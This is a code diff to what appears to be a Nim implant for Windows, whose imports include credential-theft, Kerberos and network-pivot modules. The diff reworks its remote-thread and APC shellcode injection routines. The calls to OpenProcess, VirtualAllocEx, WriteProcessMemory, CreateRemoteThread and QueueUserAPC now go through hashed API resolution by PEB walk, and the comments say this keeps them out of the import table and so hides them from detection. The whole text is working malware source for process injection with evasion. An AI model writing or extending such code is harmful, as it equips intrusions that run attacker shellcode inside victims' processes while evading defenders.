@@ -7,6 +7,7 @@ when defined(windows):
   import kerberos, pe_exec, browsercreds, dotnet
   import rsocks, http_pivot, tcp_pivot
   import bof
+  import api_hash
 
 when not defined(windows):
   import std/net
@@ -163,30 +164,38 @@ when defined(windows):
 
   # ── Remote thread injection ──────────────────────────────────────────────────
   proc doInjectRemote(pid: int; sc: seq[byte]): string =
-    let hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(pid))
+    # Resolved via PEB walk — no IAT entries for OpenProcess/VirtualAllocEx/
+    # WriteProcessMemory/VirtualProtectEx/CreateRemoteThread.
+    let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
     if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
-    defer: discard CloseHandle(hProc)
-    let mem = VirtualAllocEx(hProc, nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+    defer: discard callCloseHandle(hProc)
+    let mem = callVirtualAllocEx(hProc, nil, SIZE_T(sc.len),
+                                 MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
     if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
     var written: SIZE_T
-    discard WriteProcessMemory(hProc, mem, unsafeAddr sc[0], SIZE_T(sc.len), addr written)
+    discard callWriteProcessMemory(hProc, mem, cast[LPCVOID](unsafeAddr sc[0]),
+                                   SIZE_T(sc.len), addr written)
     var old: DWORD
-    discard VirtualProtectEx(hProc, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
+    discard callVirtualProtectEx(hProc, mem, SIZE_T(sc.len), PAGE_EXECUTE_READ, addr old)
     var tid: DWORD
-    let ht = CreateRemoteThread(hProc, nil, 0, cast[LPTHREAD_START_ROUTINE](mem), nil, 0, addr tid)
+    let ht = callCreateRemoteThread(hProc, nil, 0, mem, nil, 0, addr tid)
     if ht == 0: return "CreateRemoteThread failed (err " & $GetLastError() & ")"
-    discard CloseHandle(ht)
+    discard callCloseHandle(ht)
     return "[+] injected " & $sc.len & " bytes into PID " & $pid & " (TID=" & $tid & ")"
 
   # ── APC queue injection ──────────────────────────────────────────────────────
   proc doInjectAPC(pid: int; sc: seq[byte]): string =
-    let hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, DWORD(pid))
+    # Resolved via PEB walk — no IAT entries for OpenProcess/VirtualAllocEx/
+    # WriteProcessMemory/OpenThread/QueueUserAPC.
+    let hProc = callOpenProcess(PROCESS_ALL_ACCESS, WINBOOL(0), DWORD(pid))
     if hProc == 0: return "OpenProcess failed (err " & $GetLastError() & ")"
-    defer: discard CloseHandle(hProc)
-    let mem = VirtualAllocEx(hProc, nil, SIZE_T(sc.len), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    defer: discard callCloseHandle(hProc)
+    let mem = callVirtualAllocEx(hProc, nil, SIZE_T(sc.len),
+                                 MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     if mem == nil: return "VirtualAllocEx failed (err " & $GetLastError() & ")"
     var written: SIZE_T
-    discard WriteProcessMemory(hProc, mem, unsafeAddr sc[0], SIZE_T(sc.len), addr written)
+    discard callWriteProcessMemory(hProc, mem, cast[LPCVOID](unsafeAddr sc[0]),
+                                   SIZE_T(sc.len), addr written)
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
     if snap == INVALID_HANDLE_VALUE: return "snapshot failed"
     defer: discard CloseHandle(snap)
@@ -196,10 +205,10 @@ when defined(windows):
     if Thread32First(snap, addr te).bool:
       while true:
         if te.th32OwnerProcessID == DWORD(pid):
-          let ht = OpenThread(THREAD_SET_CONTEXT_FLAG, WINBOOL(0), te.th32ThreadID)
+          let ht = callOpenThread(THREAD_SET_CONTEXT_FLAG, WINBOOL(0), te.th32ThreadID)
           if ht != 0:
-            discard QueueUserAPC(cast[PAPCFUNC](mem), ht, 0)
-            discard CloseHandle(ht)
+            discard callQueueUserAPC(mem, ht, ULONG_PTR(0))
+            discard callCloseHandle(ht)
             inc queued
         if not Thread32Next(snap, addr te).bool: break
     return "[+] APC queued to " & $queued & " thread(s) in PID " & $pid
